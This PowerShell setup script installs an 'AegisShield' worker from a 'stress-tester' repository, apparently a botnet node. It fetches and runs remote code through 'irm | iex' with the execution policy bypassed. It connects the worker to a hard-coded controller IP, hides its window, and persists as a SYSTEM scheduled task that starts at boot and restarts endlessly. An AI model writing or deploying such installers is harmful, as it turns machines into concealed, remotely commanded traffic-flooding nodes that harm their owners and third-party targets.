# ═══════════════════════════════════════════════════════════════
#  AegisShield Worker — Windows Background Setup (PowerShell)
#  Run as Administrator:
#    irm https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_worker.ps1 | iex
# ═══════════════════════════════════════════════════════════════

param(
    [string]$ControllerIP = "159.65.32.13",
    [int]$ControllerPort = 7777
)

$ErrorActionPreference = "Stop"
$InstallDir = "C:\AegisShield"
$TaskName = "AegisWorker"
$LogFile = "$InstallDir\worker.log"

Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "  ║  AegisShield Worker — Windows Background Setup    ║" -ForegroundColor Red
Write-Host "  ╚═══════════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

# ── 1. Check for admin privileges ─────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "  [!] Re-launching as Administrator..." -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_worker.ps1 | iex`""
    exit
}

# ── 2. Check Python ───────────────────────────────────────────
Write-Host "  [1/6] Checking Python..." -ForegroundColor Cyan
$python = $null
foreach ($cmd in @("python", "python3", "py")) {
    try {
        $ver = & $cmd --version 2>&1
        if ($ver -match "Python 3") {
            $python = $cmd
            Write-Host "  [1/6] Python ✅ ($ver)" -ForegroundColor Green
            break
        }
    } catch {}
}

if (-not $python) {
    Write-Host "  [1/6] Installing Python via winget..." -ForegroundColor Yellow
    try {
        winget install Python.Python.3.12 --accept-package-agreements --accept-source-agreements --silent
        $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User")
        $python = "python"
        Write-Host "  [1/6] Python installed ✅" -ForegroundColor Green
    } catch {
        Write-Host "  [!] Failed to install Python. Please install manually from python.org" -ForegroundColor Red
        exit 1
    }
}

# ── 3. Create install directory ───────────────────────────────
Write-Host "  [2/6] Setting up $InstallDir..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null

# ── 4. Download worker.py ────────────────────────────────────
Write-Host "  [3/6] Downloading worker.py..." -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/k4ran909/stress-tester/master/worker.py" -OutFile "$InstallDir\worker.py" -UseBasicParsing

# ── 5. Create launcher script (hidden window) ────────────────
Write-Host "  [4/6] Creating background launcher..." -ForegroundColor Cyan

# VBScript launcher — runs Python completely hidden (no window)
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "$python $InstallDir\worker.py --master ${ControllerIP}:${ControllerPort}", 0, False
"@
$vbsContent | Out-File -FilePath "$InstallDir\start_worker.vbs" -Encoding ASCII

# PowerShell wrapper for Task Scheduler
$wrapperContent = @"
`$logFile = "$LogFile"
`$proc = Start-Process -FilePath "$python" -ArgumentList "$InstallDir\worker.py --master ${ControllerIP}:${ControllerPort}" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$logFile -RedirectStandardError "$InstallDir\worker_err.log"
`$proc.Id | Out-File -FilePath "$InstallDir\worker.pid"
"@
$wrapperContent | Out-File -FilePath "$InstallDir\run_worker.ps1" -Encoding UTF8

# ── 6. Stop old instances ────────────────────────────────────
Write-Host "  [5/6] Stopping old instances..." -ForegroundColor Cyan
try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

# Kill any existing worker processes
Get-Process -Name "python*" -ErrorAction SilentlyContinue | Where-Object {
    try {
        $cmdline = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
        $cmdline -like "*worker.py*"
    } catch { $false }
} | Stop-Process -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 1

# ── 7. Create Scheduled Task (runs at startup + now) ─────────
Write-Host "  [6/6] Creating scheduled task (auto-start on boot)..." -ForegroundColor Cyan

$action = New-ScheduledTaskAction `
    -Execute "wscript.exe" `
    -Argument "`"$InstallDir\start_worker.vbs`""

$triggerBoot = New-ScheduledTaskTrigger -AtStartup
$triggerNow = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartCount 999 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit (New-TimeSpan -Days 365)

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $action `
    -Trigger $triggerBoot, $triggerNow `
    -Settings $settings `
    -Principal $principal `
    -Force | Out-Null

# Start it now
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 3

# ── Verify ────────────────────────────────────────────────────
$task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
$running = Get-Process -Name "python*" -ErrorAction SilentlyContinue | Where-Object {
    try {
        $cmdline = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
        $cmdline -like "*worker.py*"
    } catch { $false }
}

Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║  ✅ Worker is RUNNING IN BACKGROUND               ║" -ForegroundColor Green
Write-Host "  ╠═══════════════════════════════════════════════════╣" -ForegroundColor Green
Write-Host "  ║  Controller: ${ControllerIP}:${ControllerPort}   " -ForegroundColor Cyan
Write-Host "  ║  Install:    $InstallDir                          " -ForegroundColor Cyan
Write-Host "  ║  Mode:       Windows Scheduled Task (SYSTEM)      " -ForegroundColor Cyan
Write-Host "  ║  Auto-start: YES (runs on boot)                   ║" -ForegroundColor Cyan
Write-Host "  ║  Auto-restart: YES (every 1 min on failure)       ║" -ForegroundColor Cyan
Write-Host "  ║  Hidden:     YES (no window visible)              ║" -ForegroundColor Cyan
Write-Host "  ╚═══════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "  📋 Commands (run as Admin):" -ForegroundColor Yellow
Write-Host "     Get-ScheduledTask -TaskName AegisWorker         # status"
Write-Host "     Start-ScheduledTask -TaskName AegisWorker       # start"
Write-Host "     Stop-ScheduledTask -TaskName AegisWorker        # stop"
Write-Host "     Get-Content $LogFile -Tail 20                   # logs"
Write-Host "     Unregister-ScheduledTask -TaskName AegisWorker  # remove"
Write-Host ""
